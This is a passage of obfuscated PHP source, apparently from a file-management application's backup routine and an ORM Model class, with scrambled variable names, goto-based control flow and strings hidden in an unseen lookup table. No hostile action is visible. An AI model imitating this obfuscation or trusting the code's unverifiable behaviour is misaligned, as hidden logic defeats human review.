$Eƒ¤å–íÜÜ->task[$_SERVER[Ö][691]] = $A­¾ôåØš; $Eæ®ƒĞÖóÏ = array($_SERVER[Ö][731] => $f¯£¬âù‰ù, $_SERVER[Ö][732] => $A­¾ôåØš); Backup::set($Eæ®ƒĞÖóÏ); goto d‡Š¦àÕùé; d‡Š¦àÕùé: $BÙøœÜŒâˆ = !0; $fÀŸìÃÇšè = $this->storeIds(); $aÎ¬¡¼ÎÑŞ = 1; goto C¯İåËÈÖ; C¯İåËÈÖ: $CØãğÑòÁƒ = 1000; $C±—ëÖˆé = $eõ›‘õçáæ = 0; $D˜ˆ‹™±¨· = array(); goto BÕË˜”Ê¿; D×Ÿ®óğ: $fë¥Æ¸Ìè¬ = Backup::get(); $eƒ²ˆ§ÏœŠ = $fë¥Æ¸Ìè¬[$_SERVER[Ö][277]][$_SERVER[Ö][163]][$_SERVER[Ö][415]]; $D–·’íåÜ = array($_SERVER[Ö][416] => array($_SERVER[Ö][727], $eƒ²ˆ§ÏœŠ), $_SERVER[Ö][728] => array($_SERVER[Ö][315], $fë¥Æ¸Ìè¬[$_SERVER[Ö][684]])); goto c¶äÆš…ß»; D›‚İ„Î: $féÚ£Û™öô = $BÙøœÜŒâˆ ? 1 : 0; $Eæ®ƒĞÖóÏ = array($_SERVER[Ö][743] => 1, $_SERVER[Ö][696] => time(), $_SERVER[Ö][702] => $féÚ£Û™öô, $_SERVER[Ö][740] => $eƒ²ˆ§ÏœŠ, $_SERVER[Ö][732] => $A­¾ôåØš, $_SERVER[Ö][731] => $f¯£¬âù‰ù); if ($eõ›‘õçáæ) { $Eæ®ƒĞÖóÏ[$_SERVER[Ö][741]] = $FƒĞ—‘‰Ê»; $Eæ®ƒĞÖóÏ[$_SERVER[Ö][742]] = $eÏ²Ø­œ; } goto FŸ¢é¾‰îÓ; FŸ¢é¾‰îÓ: Backup::set($Eæ®ƒĞÖóÏ); $this->_fileFilter($D˜ˆ‹™±¨·); return !0; goto EÁ‡šŒ²œŠ; BÕË˜”Ê¿: $eÏ²Ø­œ = $FƒĞ—‘‰Ê» = 0; do { $Cˆã„Ûâ = $_SERVER[Ö][733]; $Díø”ÁãÃô = Model($_SERVER[Ö][712])->where($D–·’íåÜ)->field($Cˆã„Ûâ)->order($_SERVER[Ö][734])->selectPage($CØãğÑòÁƒ, $aÎ¬¡¼ÎÑŞ); $D•¸èÍõÖ = !empty($Díø”ÁãÃô[$_SERVER[Ö][350]]) ? $Díø”ÁãÃô[$_SERVER[Ö][350]] : array(); foreach ($D•¸èÍõÖ as $EŒÉ¾Ï¸–ã) { goto e‚¥ŠÛ¬ø; AÙ Şš‘ìà: if ($C±—ëÖˆé >= 1024 * 1024 * 100) { $Eæ®ƒĞÖóÏ = array($_SERVER[Ö][740] => $eƒ²ˆ§ÏœŠ, $_SERVER[Ö][741] => $FƒĞ—‘‰Ê», $_SERVER[Ö][742] => $eÏ²Ø­œ); Backup::set($Eæ®ƒĞÖóÏ); $C±—ëÖˆé = $eõ›‘õçáæ = 0; } goto Aºˆó¥£äÅ; a‹åÜ£„ŸÇ: $C±—ëÖˆé += $EŒÉ¾Ï¸–ã[$_SERVER[Ö][77]]; $FƒĞ—‘‰Ê» += 1; $eÏ²Ø­œ += $EŒÉ¾Ï¸–ã[$_SERVER[Ö][77]]; goto AÙ Şš‘ìà; e‚¥ŠÛ¬ø: if (!$this->_fileExist($EŒÉ¾Ï¸–ã, $D˜ˆ‹™±¨·, $fÀŸìÃÇšè)) { $f¯£¬âù‰ù -= 1; $A­¾ôåØš -= (int) $EŒÉ¾Ï¸–ã[$_SERVER[Ö][77]]; write_log("\146\151\x6c\145\x20\x6e\x6f\164\x20\x65\170\151\163\164\56\x66\151\x6c\145\x49\104\72{$EŒÉ¾Ï¸–ã[$_SERVER[Ö][415]]}\54\x20\x70\x61\164\150\x3a{$EŒÉ¾Ï¸–ã[$_SERVER[Ö][75]]}", $_SERVER[Ö][735]); continue; } $e‘šòÖÁ„Ÿ = $EŒÉ¾Ï¸–ã[$_SERVER[Ö][75]]; $BÄˆò£âƒ» = "\173\151\157\72{$fë¥Æ¸Ìè¬[$_SERVER[Ö][684]]}\x7d" . substr($e‘šòÖÁ„Ÿ, strlen("\x7b\x69\157\x3a{$EŒÉ¾Ï¸–ã[$_SERVER[Ö][736]]}\175")); goto c¹­Ä×†; c¹­Ä×†: if (IO::exist($BÄˆò£âƒ»)) { $Eƒ¤å–íÜÜ->updateFileEnd($EŒÉ¾Ï¸–ã[$_SERVER[Ö][28]], $EŒÉ¾Ï¸–ã[$_SERVER[Ö][77]]); } else { $BÄˆò£âƒ» = get_path_father($BÄˆò£âƒ»); IO::mkdir($BÄˆò£âƒ»); if (!IO::copy($e‘šòÖÁ„Ÿ, $BÄˆò£âƒ», $_SERVER[Ö][737])) { write_log($_SERVER[Ö][738] . $e‘šòÖÁ„Ÿ . $_SERVER[Ö][739] . $BÄˆò£âƒ» . $_SERVER[Ö][472], $_SERVER[Ö][705]); $BÙøœÜŒâˆ = !1; break; } } $eƒ²ˆ§ÏœŠ = $EŒÉ¾Ï¸–ã[$_SERVER[Ö][415]]; $eõ›‘õçáæ += 1; goto a‹åÜ£„ŸÇ; Aºˆó¥£äÅ: } $cÖº£ÀÆ¸Ò = count($D•¸èÍõÖ); $aÎ¬¡¼ÎÑŞ++; } while ($cÖº£ÀÆ¸Ò == $CØãğÑòÁƒ); $Eƒ¤å–íÜÜ->end(); goto D›‚İ„Î; c¶äÆš…ß»: $f¯£¬âù‰ù = (int) Model($_SERVER[Ö][712])->where($D–·’íåÜ)->count($_SERVER[Ö][415]); $A­¾ôåØš = (int) Model($_SERVER[Ö][712])->where($D–·’íåÜ)->sum($_SERVER[Ö][77]); $Eƒ¤å–íÜÜ = new TaskFileTransfer($_SERVER[Ö][729], $_SERVER[Ö][705], $f¯£¬âù‰ù, LNG($_SERVER[Ö][706]) . $_SERVER[Ö][707] . LNG($_SERVER[Ö][730])); goto bóÍªÈÃ·; EÁ‡šŒ²œŠ: } private function _fileExist($A Ö…«ë¢ˆ, &$bšå—§†Œ¯, $C°¯¡¢Ğ¡¹) { goto DŠ±¼ÌèÆ; FİÊËŸ›â: if (IO::exist($bµíİâÉğÙ)) { $bšå—§†Œ¯[] = $A Ö…«ë¢ˆ[$E±±’Ëä‹İ[415]]; return !1; } $cñŸÎ—© = array($E±±’Ëä‹İ[736] => $A Ö…«ë¢ˆ[$E±±’Ëä‹İ[736]], $E±±’Ëä‹İ[75] => array($E±±’Ëä‹İ[744], "{$bµíİâÉğÙ}\x25")); $CÜ³¦©Å£ = Model($E±±’Ëä‹İ[712])->where($cñŸÎ—©)->field($E±±’Ëä‹İ[416])->select(); goto cµÄ–Ãœ³Š; cµÄ–Ãœ³Š: $bšå—§†Œ¯ = array_merge($bšå—§†Œ¯, array_to_keyvalue($CÜ³¦©Å£, $E±±’Ëä‹İ[33], $E±±’Ëä‹İ[415])); return !1; goto eõÎÑ¬¤„µ; F³¿—½Şã: if (!in_array($A Ö…«ë¢ˆ[$E±±’Ëä‹İ[736]], $C°¯¡¢Ğ¡¹)) { return !1; } if (IO::exist($B´³¿ÛÓğ³)) { return !0; } $bµíİâÉğÙ = get_path_father($B´³¿ÛÓğ³); goto FİÊËŸ›â; DŠ±¼ÌèÆ: $E±±’Ëä‹İ =& $_SERVER[Ö]; $B´³¿ÛÓğ³ = $A Ö…«ë¢ˆ[$E±±’Ëä‹İ[75]]; if (in_array($A Ö…«ë¢ˆ[$E±±’Ëä‹İ[415]], $bšå—§†Œ¯)) { return !1; } goto F³¿—½Şã; eõÎÑ¬¤„µ: } private function _fileFilter($cÖ¿‘”¥å) { $EËéïê¶ Ú =& $_SERVER[Ö]; if (empty($cÖ¿‘”¥å)) { return; } $EÌ†‡““ä± = array($EËéïê¶ Ú[415] => array($EËéïê¶ Ú[7], array_unique($cÖ¿‘”¥å))); $B‰†‹ƒ‡Ÿæ = Model($EËéïê¶ Ú[745])->where($EÌ†‡““ä±)->field($EËéïê¶ Ú[365])->select(); foreach ($B‰†‹ƒ‡Ÿæ as $fÄï §›ÅÓ) { Model($EËéïê¶ Ú[745])->remove($fÄï §›ÅÓ[$EËéïê¶ Ú[365]], !1); } } private function storeIds() { $eØ±Ú™‘‡ =& $_SERVER[Ö]; $f´…±‰Ä¯İ = Model($eØ±Ú™‘‡[697])->listData(); return array_to_keyvalue($f´…±‰Ä¯İ, $eØ±Ú™‘‡[33], $eØ±Ú™‘‡[363]); } } goto AÛé´ š­; fÉÖº’ ¤ã: define($_SERVER[Ö][226], 0); define($_SERVER[Ö][227], 2); class Model extends ClassBaseCall { private $_extModel = null; protected $db = null; protected $pk = "\151\144"; protected $tablePrefix = ''; protected $name = ''; protected $dbName = ''; protected $connection = ''; protected $tableName = ''; protected $trueTableName = ''; protected $error = ''; protected $fields = array(); protected $data = array(); protected $options = array(); protected $_validate = array(); protected $_auto = array(); protected $_map = array(); protected $_scope = array(); protected $autoCheckFields = true; protected $patchValidate = false; protected $methods = array("\x74\x61\142\x6c\145", "\x6f\162\x64\x65\162", "\x61\154\151\x61\x73", "\150\x61\x76\x69\x6e\147", "\147\x72\x6f\165\160", "\154\x6f\143\x6b", "\x64\x69\163\164\151\156\143\x74", "\x61\x75\164\x6f", "\146\x69\x6c\164\x65\162", "\x76\x61\x6c\x69\x64\141\x74\x65", "\x72\145\x73\x75\x6c\164", "\x62\151\x6e\x64", "\164\157\153\145\156"); public function __construct($CçÌù±™î = '', $B±ÏÉŠğƒª = '', $a†ßÌÜÍ² = '') { $d‹­ÈôíËÔ =& $_SERVER[Ö]; $this->_initialize(); if (!empty($CçÌù±™î)) { if (strpos($CçÌù±™î, $d‹­ÈôíËÔ[91])) { list($this->dbName, $this->name) = explode($d‹­ÈôíËÔ[91], $CçÌù±™î); } else { $this->name = $CçÌù±™î; } } elseif (empty($this->name)) { $this->name = $this->getModelName(); } if (is_null($B±ÏÉŠğƒª)) { $this->tablePrefix = $d‹­ÈôíËÔ[33]; } elseif ($d‹­ÈôíËÔ[33] != $B±ÏÉŠğƒª) { $this->tablePrefix = $B±ÏÉŠğƒª; } else { $this->tablePrefix = $this->tablePrefix ? $this->tablePrefix : think_config($d‹­ÈôíËÔ[228]); } $this->db(0, empty($this->connection) ? $a†ßÌÜÍ² : $this->connection); $this->_classObjectID = mt_rand(0, 10000); } protected function _checkTableInfo() { $càó§ÔÁ± =& $_SERVER[Ö]; if (empty($this->fields)) { if (think_config($càó§ÔÁ±[229])) { $fœÓçôŒÛ† = $this->dbName ? $this->dbName : think_config($càó§ÔÁ±[230]); $DùÃÛÎ¨‡ = think_var_cache($càó§ÔÁ±[231] . strtolower(get_path_this($fœÓçôŒÛ†) . $càó§ÔÁ±[91] . $this->name)); if ($DùÃÛÎ¨‡) { $e·Ôóà˜‚ = think_config($càó§ÔÁ±[232]); if (empty($e·Ôóà˜‚) || $DùÃÛÎ¨‡[$càó§ÔÁ±[233]] == $e·Ôóà˜‚) { $this->fields = $DùÃÛÎ¨‡; return; } } } $this->flush(); } } public function flush() { goto b‹ÈÒ›—§; b‹ÈÒ›—§: $FÊ¦›É‹ˆ =& $_SERVER[Ö]; $this->db->setModel($this->name); $Fç³ãõÉù = $this->db->getFields($this->getTableName()); goto DæÚÍô¦ÙÉ; DæÚÍô¦ÙÉ: if (!$Fç³ãõÉù) { return !1; } $this->fields = array_keys($Fç³ãõÉù); $this->fields[$FÊ¦›É‹ˆ[234]] = !1; goto fĞîŞ÷ˆ‡ù; A´ŠÓ¼àÑé: if (think_config($FÊ¦›É‹ˆ[229])) { $cœ…ğíùˆè = $this->dbName ? $this->dbName : think_config($FÊ¦›É‹ˆ[230]); think_var_cache($FÊ¦›É‹ˆ[231] . strtolower(get_path_this($cœ…ğíùˆè) . $FÊ¦›É‹ˆ[91] . $this->name), $this->fields); } goto BÇÔßÅ¯ªÓ; fĞîŞ÷ˆ‡ù: foreach ($Fç³ãõÉù as $fŸÑ¶¿º“ => $D±ËÌ¼°Ûê) { $Cáœ¬ÜèĞˆ[$fŸÑ¶¿º“] = $D±ËÌ¼°Ûê[$FÊ¦›É‹ˆ[29]]; if ($D±ËÌ¼°Ûê[$FÊ¦›É‹ˆ[36]]) { $this->fields[$FÊ¦›É‹ˆ[235]] = $fŸÑ¶¿º“; if ($D±ËÌ¼°Ûê[$FÊ¦›É‹ˆ[39]]) { $this->fields[$FÊ¦›É‹ˆ[234]] = !0; } } } $this->fields[$FÊ¦›É‹ˆ[236]] = $Cáœ¬ÜèĞˆ; if (think_config($FÊ¦›É‹ˆ[232])) { $this->fields[$FÊ¦›É‹ˆ[233]] = think_config($FÊ¦›É‹ˆ[232]); } goto A´ŠÓ¼àÑé; BÇÔßÅ¯ªÓ: } public function switchModel($c«…“²”Á, $B¨…Üïê½ = array()) { $F¦¼ğïÚ– =& $_SERVER[Ö]; $Fš‘ÊÅ¸Œ¤ = ucwords(strtolower($c«…“²”Á)) . $F¦¼ğïÚ–[237]; if (!class_exists($Fš‘ÊÅ¸Œ¤)) { think_exception($Fš‘ÊÅ¸Œ¤ . think_lang($F¦¼ğïÚ–[238])); } $this->_extModel = new $Fš‘ÊÅ¸Œ¤($this->name); if (!empty($B¨…Üïê½)) { foreach ($B¨…Üïê½ as $eÚÎ¿¥†¬ç) { $this->_extModel->setProperty($eÚÎ¿¥†¬ç, $this->{$eÚÎ¿¥†¬ç}); } } return $this->_extModel; } public function __set($B‹’Œ‰­å, $dòí®…Ê¤É) { $this->data[$B‹’Œ‰­å] = $dòí®…Ê¤É; } public function __get($C¦ç³»ŒÓ) { return isset($this->data[$C¦ç³»ŒÓ]) ? $this->data[$C¦ç³»ŒÓ] : null; } public function __isset($CÛ¯øœÊ§Ó) { return isset($this->data[$CÛ¯øœÊ§Ó]); } public function __unset($F´„§§Äé) { unset($this->data[$F´„§§Äé]); } public function __call($B‡ãïö’Ç, $c°æÄï‚—İ) { $bš®öô²Š =& $_SERVER[Ö]; if (in_array(strtolower($B‡ãïö’Ç), $this->methods, !0)) { $this->options[strtolower($B‡ãïö’Ç)] = $c°æÄï‚—İ[0]; return $this; } elseif (in_array(strtolower($B‡ãïö’Ç), array($bš®öô²Š[239], $bš®öô²Š[240], $bš®öô²Š[241], $bš®öô²Š[242], $bš®öô²Š[243]), !0)) { $dõ´…ë‚©÷ = isset($c°æÄï‚—İ[0]) ? $c°æÄï‚—İ[0] : $bš®öô²Š[172]; $dõ´…ë‚©÷ = $this->db->parseKey($dõ´…ë‚©÷); return $this->getField(strtoupper($B‡ãïö’Ç) . $bš®öô²Š[244] . $dõ´…ë‚©÷ . $bš®öô²Š[245] . $B‡ãïö’Ç, $bš®öô²Š[239]); } elseif (strtolower(substr($B‡ãïö’Ç, 0, 5)) == $bš®öô²Š[246]) { $dõ´…ë‚©÷ = think_parse_name(substr($B‡ãïö’Ç, 5)); $c°ÛàÁ›èå[$dõ´…ë‚©÷] = $c°æÄï‚—İ[0]; return $this->where($c°ÛàÁ›èå)->find(); } elseif (strtolower(substr($B‡ãïö’Ç, 0, 10)) == $bš®öô²Š[247]) { $bÓšÁğÃÏ¶ = think_parse_name(substr($B‡ãïö’Ç, 10)); $c°ÛàÁ›èå[$bÓšÁğÃÏ¶] = $c°æÄï‚—İ[0]; return $this->where($c°ÛàÁ›èå)->getField($c°æÄï‚—İ[1]); } elseif (isset($this->_scope[$B‡ãïö’Ç])) { return $this->scope($B‡ãïö’Ç, $c°æÄï‚—İ[0]); } elseif (method_exists($this, $B‡ãïö’Ç)) { array_unshift($c°æÄï‚—İ, $B‡ãïö’Ç); return call_user_func_array(array($this, $bš®öô²Š[248]), $c°æÄï‚—İ); } else { return call_user_func_array(array(parent, $B‡ãïö’Ç), $c°æÄï‚—İ); } } protected function call() { goto bññ•ğ¦çÑ; bññ•ğ¦çÑ: $A…ò‹¾ğ” =& $_SERVER[Ö]; $Eö‚Ò‹Ã×¥ = func_get_args(); $D÷ğ÷éÛ°£ = array_shift($Eö‚Ò‹Ã×¥); goto bòƒŒ³­¥¼; cñÎœ½Ï·Ÿ: if (isset($Eö‚Ò‹Ã×¥[$C‰¤¨¶ÚõÖ]) && $Eö‚Ò‹Ã×¥[$C‰¤¨¶ÚõÖ] === $D÷ğ÷éÛ°£) { think_exception(__CLASS__ . $A…ò‹¾ğ”[4] . $D÷ğ÷éÛ°£ . think_lang($A…ò‹¾ğ”[249])); return; } $Eö‚Ò‹Ã×¥[] = $D÷ğ÷éÛ°£; if (method_exists($this, $A…ò‹¾ğ”[250])) { $A§Áø«´­ = call_user_func_array(array($this, $A…ò‹¾ğ”[251]), array($Aá¯‹©ÏóÎ, $Eö‚Ò‹Ã×¥)); if (!is_null($A§Áø«´­) && $A§Áø«´­ !== !1) { return $A§Áø«´­; } } goto cõô·öõÙ†; bòƒŒ³­¥¼: $Aá¯‹©ÏóÎ = $D÷ğ÷éÛ°£; if (is_array($D÷ğ÷éÛ°£)) { $Aá¯‹©ÏóÎ = $D÷ğ÷éÛ°£[1]; $D÷ğ÷éÛ°£ = $D÷ğ÷éÛ°£[0]; } $C‰¤¨¶ÚõÖ = count($Eö‚Ò‹Ã×¥) - 1; goto cñÎœ½Ï·Ÿ; cõô·öõÙ†: $Fàï¬÷¯“Í = call_user_func_array(array($this, $D÷ğ÷éÛ°£), $Eö‚Ò‹Ã×¥); if (method_exists($this, $A…ò‹¾ğ”[252])) { $A§Áø«´­ = call_user_func_array(array($this, $A…ò‹¾ğ”[253]), array($Aá¯‹©ÏóÎ, $Eö‚Ò‹Ã×¥, $Fàï¬÷¯“Í)); if ($A§Áø«´­) { return $A§Áø«´­; } } return $Fàï¬÷¯“Í; goto fĞÂâóÓ£…; fĞÂâóÓ£…: } protected function _initialize() { } protected function _facade($aÉ˜ŠËÃå) { $b‹áĞñò½ =& $_SERVER[Ö]; if (!empty($this->fields)) { foreach ($aÉ˜ŠËÃå as $AŠãÙ‰ÏÉ => $dôÍ…‡¨) { if (!in_array($AŠãÙ‰ÏÉ, $this->fields, !0)) { unset($aÉ˜ŠËÃå[$AŠãÙ‰ÏÉ]); } elseif (is_scalar($dôÍ…‡¨)) { $this->_parseType($aÉ˜ŠËÃå, $AŠãÙ‰ÏÉ); } } } if (!empty($this->options[$b‹áĞñò½[254]])) { $aÉ˜ŠËÃå = array_map($this->options[$b‹áĞñò½[254]], $aÉ˜ŠËÃå); unset($this->options[$b‹áĞñò½[254]]); } $this->_beforeWrite($aÉ˜ŠËÃå); return $aÉ˜ŠËÃå; } protected function _beforeWrite(&$E®õªŠ™™ô) { } public function add($E¨ãˆÊÎ™ = '', $cİ×œŞÂõÃ = array(), $a¥æÅßĞß² = false) { goto då¯İ¿ˆ‰é; fçñóç–Û¢: return $eÎ±×Á¤«æ; goto DÆóŒ§˜õ; eŞŒæŞï¾„: if (!1 === $this->_beforeInsert($E¨ãˆÊÎ™, $cİ×œŞÂõÃ)) { return !1; } $eÎ±×Á¤«æ = $this->db->insert($E¨ãˆÊÎ™, $cİ×œŞÂõÃ, $a¥æÅßĞß²); if (!1 !== $eÎ±×Á¤«æ) { $B±öœÓŞ¡ = $this->getLastInsID(); if ($B±öœÓŞ¡) { $E¨ãˆÊÎ™[$this->getPk()] = $B±öœÓŞ¡; $this->_after_insert($E¨ãˆÊÎ™, $cİ×œŞÂõÃ); return $B±öœÓŞ¡; } $this->_after_insert($E¨ãˆÊÎ™, $cİ×œŞÂõÃ); } goto fçñóç–Û¢; då¯İ¿ˆ‰é: if (empty($E¨ãˆÊÎ™)) { if (!empty($this->data)) { $E¨ãˆÊÎ™ = $this->data; $this->data = array(); } else { $this->error = think_lang($_SERVER[Ö][255]); return !1; } } $cİ×œŞÂõÃ = $this->_parseOptions($cİ×œŞÂõÃ); $E¨ãˆÊÎ™ = $this->_facade($E¨ãˆÊÎ™); goto eŞŒæŞï¾„; DÆóŒ§˜õ: } protected function _beforeInsert(&$EËÆ£†õ Ï, $Cêê˜ô¶ ) { } protected function _after_insert($bÜÆîóÃºÌ, $CÅÈÒ£‹») { } public function addAll($e±œ¯ÑÛ“Â, $FîÔ¶Éï´ = array(), $dƒµ¥é±ù£ = false) { goto FÑÏÙ÷Õåï; F¼‰çßœ¾°: return $fîç·ˆòöà; goto e¢ô¡ø»Ëá; FÑÏÙ÷Õåï: $EÚ§„¢´ÆŒ =& $_SERVER[Ö]; if (empty($e±œ¯ÑÛ“Â)) { $this->error = think_lang($EÚ§„¢´ÆŒ[255]); return !1; } $FîÔ¶Éï´ = $this->_parseOptions($FîÔ¶Éï´); goto a‰†Áøçƒ; a‰†Áøçƒ: foreach ($e±œ¯ÑÛ“Â as $B‘Ù“•ù¢ => $EÍéˆ•ÛÇ) { $e±œ¯ÑÛ“Â[$B‘Ù“•ù¢] = $this->_facade($EÍéˆ•ÛÇ); } if (method_exists($this->db, $EÚ§„¢´ÆŒ[256])) { $fîç·ˆòöà = $this->db->insertAll($e±œ¯ÑÛ“Â, $FîÔ¶Éï´, $dƒµ¥é±ù£); } else { $this->startTrans(); foreach ($e±œ¯ÑÛ“Â as $B‘Ù“•ù¢ => $EÍéˆ•ÛÇ) { $fîç·ˆòöà = $this->db->insert($EÍéˆ•ÛÇ, $FîÔ¶Éï´, $dƒµ¥é±ù£); } $this->commit(); } if (!1 !== $fîç·ˆòöà) { $Bì¼Ë´‡¼Å = $this->getLastInsID(); if ($Bì¼Ë´‡¼Å) { return $Bì¼Ë´‡¼Å; } } goto F¼‰çßœ¾°; e¢ô¡ø»Ëá: } public function selectAdd($a¶Ëğ¢Ï¥Ü = '', $Fï©Í‘æÄ¶ = '', $A˜Ùñ’ºİŸ = array()) { $aÎ‚­¹é„µ =& $_SERVER[Ö]; $A˜Ùñ’ºİŸ = $this->_parseOptions($A˜Ùñ’ºİŸ); if (!1 === ($B©„ØÆ¨œ¸ = $this->db->selectInsert($a¶Ëğ¢Ï¥Ü ? $a¶Ëğ¢Ï¥Ü : $A˜Ùñ’ºİŸ[$aÎ‚­¹é„µ[257]], $Fï©Í‘æÄ¶ ? $Fï©Í‘æÄ¶ : $this->getTableName(), $A˜Ùñ’ºİŸ))) { $this->error = think_lang($aÎ‚­¹é„µ[258]); return !1; } else { return $B©„ØÆ¨œ¸; } } public function save($b¨’Ì’…±ë = '', $CÕÂÑ…¨¯ = array()) { goto AÉ¨«ÎËÔ–; aáÕ‰‘Ò¤: if (!1 !== $Aİ·³¾¿Á±) { if (isset($bŸêî¾â½ˆ)) { $b¨’Ì’…±ë[$aæä˜ÉŸ] = $bŸêî¾â½ˆ; } $this->_afterUpdate($b¨’Ì’…±ë, $CÕÂÑ…¨¯); } return $Aİ·³¾¿Á±; goto c‡›ÜÄ¹ÀÈ; AÉ¨«ÎËÔ–: $Eí‹ÑËæ‰ˆ =& $_SERVER[Ö]; if (empty($b¨’Ì’…±ë)) { if (!empty($this->data)) { $b¨’Ì’…±ë = $this->data; $this->data = array(); } else { $this->error = think_lang($Eí‹ÑËæ‰ˆ[255]); return !1; } } $b¨’Ì’…±ë = $this->_facade($b¨’Ì’…±ë); goto aëğæ‚œ†ª; Fš¾Š–î: if (is_array($CÕÂÑ…¨¯[$Eí‹ÑËæ‰ˆ[259]]) && isset($CÕÂÑ…¨¯[$Eí‹ÑËæ‰ˆ[259]][$aæä˜ÉŸ])) { $bŸêî¾â½ˆ = $CÕÂÑ…¨¯[$Eí‹ÑËæ‰ˆ[259]][$aæä˜ÉŸ]; } if (!1 === $this->_beforeUpdate($b¨’Ì’…±ë, $CÕÂÑ…¨¯)) { return !1; } $Aİ·³¾¿Á± = $this->db->update($b¨’Ì’…±ë, $CÕÂÑ…¨¯); goto aáÕ‰‘Ò¤; aëğæ‚œ†ª: $CÕÂÑ…¨¯ = $this->_parseOptions($CÕÂÑ…¨¯); $aæä˜ÉŸ = $this->getPk(); if (!isset($CÕÂÑ…¨¯[$Eí‹ÑËæ‰ˆ[259]])) { if (isset($b¨’Ì’…±ë[$aæä˜ÉŸ])) { $BÂÓ›ÕÁ£‰[$aæä˜ÉŸ] = $b¨’Ì’…±ë[$aæä˜ÉŸ]; $CÕÂÑ…¨¯[$Eí‹ÑËæ‰ˆ[259]] = $BÂÓ›ÕÁ£‰; unset($b¨’Ì’…±ë[$aæä˜ÉŸ]); } else { $this->error = think_lang($Eí‹ÑËæ‰ˆ[258]); return !1; } } goto Fš¾Š–î; c‡›ÜÄ¹ÀÈ: } protected function _beforeUpdate(&$d·œæÛù², $bòïåê¿‹¸) { } protected function _afterUpdate($A«¼ÌåÇ–, $bˆ¸„éùÀ) { } public function delete($CÙÃŠÜ°Ê± = array()) { goto b¦À÷ôß‘È; b¦À÷ôß‘È: $a†ƒø¼øí =& $_SERVER[Ö]; if (empty($CÙÃŠÜ°Ê±) && empty($this->options[$a†ƒø¼øí[259]])) { if (!empty($this->data) && isset($this->data[$this->getPk()])) { return $this->delete($this->data[$this->getPk()]); } else { return !1; } } $bğÆĞĞ‚øˆ = $this->getPk(); goto F¡«˜²Î“Š; d…ª»ï“»‡: $A–Õ‘šˆ™„ = $this->db->delete($CÙÃŠÜ°Ê±); if (!1 !== $A–Õ‘šˆ™„) { $B“¶èÒì™Ú = array(); if (isset($f’ôŠÃ ä)) { $B“¶èÒì™Ú[$bğÆĞĞ‚øˆ] = $f’ôŠÃ ä; } $this->_after_delete($B“¶èÒì™Ú, $CÙÃŠÜ°Ê±); } return $A–Õ‘šˆ™„; goto céç““¯Ò‡; F¡«˜²Î“Š: if (is_numeric($CÙÃŠÜ°Ê±) || is_string($CÙÃŠÜ°Ê±)) { if (strpos($CÙÃŠÜ°Ê±, $a†ƒø¼øí[47])) { $aêÎš×[$bğÆĞĞ‚øˆ] = array($a†ƒø¼øí[260], $CÙÃŠÜ°Ê±); } else { $aêÎš×[$bğÆĞĞ‚øˆ] = $CÙÃŠÜ°Ê±; } $this->options[$a†ƒø¼øí[259]] = $aêÎš×; } $CÙÃŠÜ°Ê± = $this->_parseOptions(); if (is_array($CÙÃŠÜ°Ê±[$a†ƒø¼øí[259]]) && isset($CÙÃŠÜ°Ê±[$a†ƒø¼øí[259]][$bğÆĞĞ‚øˆ])) { $f’ôŠÃ ä = $CÙÃŠÜ°Ê±[$a†ƒø¼øí[259]][$bğÆĞĞ‚øˆ]; } goto d…ª»ï“»‡; céç““¯Ò‡: } protected function _after_delete($B¡µ¡’îƒƒ, $DÌ¤« “‘) { } public function select($EŸñãµœ§ = array()) { goto F³—İÛ †Ó; Bé›Èô†¬‚: $this->_afterSelect($e¿ÛéÊŞÈ , $EŸñãµœ§); return $e¿ÛéÊŞÈ ; goto EÙËÚŸ¯œ»; F³—İÛ †Ó: $FÌÀå¯‚‚Ç =& $_SERVER[Ö]; if (is_string($EŸñãµœ§) || is_numeric($EŸñãµœ§)) { $aÛØƒÆŠ = $this->getPk(); if (strpos($EŸñãµœ§, $FÌÀå¯‚‚Ç[47])) { $d„°ØÂ¿¤ò[$aÛØƒÆŠ] = array($FÌÀå¯‚‚Ç[260], $EŸñãµœ§); } else { $d„°ØÂ¿¤ò[$aÛØƒÆŠ] = $EŸñãµœ§; } $this->options[$FÌÀå¯‚‚Ç[259]] = $d„°ØÂ¿¤ò; } elseif (!1 === $EŸñãµœ§) { $EŸñãµœ§ = $this->_parseOptions(); return $FÌÀå¯‚‚Ç[261] . $this->db->buildSelectSql($EŸñãµœ§) . $FÌÀå¯‚‚Ç[262]; } $EŸñãµœ§ = $this->_parseOptions(); goto aÓ”’æ¤‹; aÓ”’æ¤‹: $e¿ÛéÊŞÈ  = $this->db->select($EŸñãµœ§); if (!1 === $e¿ÛéÊŞÈ ) { return !1; } if (empty($e¿ÛéÊŞÈ )) { return null; } goto Bé›Èô†¬‚; EÙËÚŸ¯œ»: } protected function _afterSelect(&$DŠ¤ôôÃƒ, $aÌÅŸ¹¢‹) { } public function buildSql($CŞ‹ªä÷Áˆ = array()) { $e×‡Ù·¼Ì =& $_SERVER[Ö]; $CŞ‹ªä÷Áˆ = $this->_parseOptions($CŞ‹ªä÷Áˆ); return $e×‡Ù·¼Ì[261] . $this->db->buildSelectSql($CŞ‹ªä÷Áˆ) . $e×‡Ù·¼Ì[262]; } public function optionsValue($f’äŞ¼áìµ = null) { if (is_null($f’äŞ¼áìµ)) { return $this->options; } elseif (is_array($f’äŞ¼áìµ)) { $this->options = array_merge($this->options, $f’äŞ¼áìµ); } } protected function _parseOptions($BÄ‚ ¬±ƒÄ = array()) { goto cÇ¥Ö˜¦×; cÇ¥Ö˜¦×: $AÄó£‡¯÷ô =& $_SERVER[Ö]; if (is_array($BÄ‚ ¬±ƒÄ)) { $BÄ‚ ¬±ƒÄ = array_merge($this->options, $BÄ‚ ¬±ƒÄ); } $this->options = array(); goto Eğ”Ç›Ëë; eŸëÌ†Úê¾: if (isset($BÄ‚ ¬±ƒÄ[$AÄó£‡¯÷ô[259]]) && is_array($BÄ‚ ¬±ƒÄ[$AÄó£‡¯÷ô[259]]) && !empty($FéÕ…Œ×†ã) && !isset($BÄ‚ ¬±ƒÄ[$AÄó£‡¯÷ô[266]]) && !isset($BÄ‚ ¬±ƒÄ[$AÄó£‡¯÷ô[263]])) { foreach ($BÄ‚ ¬±ƒÄ[$AÄó£‡¯÷ô[259]] as $a³ôŞ·­Ï° => $cÈÓ·—ÃÉ) { $a³ôŞ·­Ï° = trim($a³ôŞ·­Ï°); if (in_array($a³ôŞ·­Ï°, $FéÕ…Œ×†ã, !0)) { if (is_scalar($cÈÓ·—ÃÉ)) { $this->_parseType($BÄ‚ ¬±ƒÄ[$AÄó£‡¯÷ô[259]], $a³ôŞ·­Ï°); } } elseif (!is_numeric($a³ôŞ·­Ï°) && 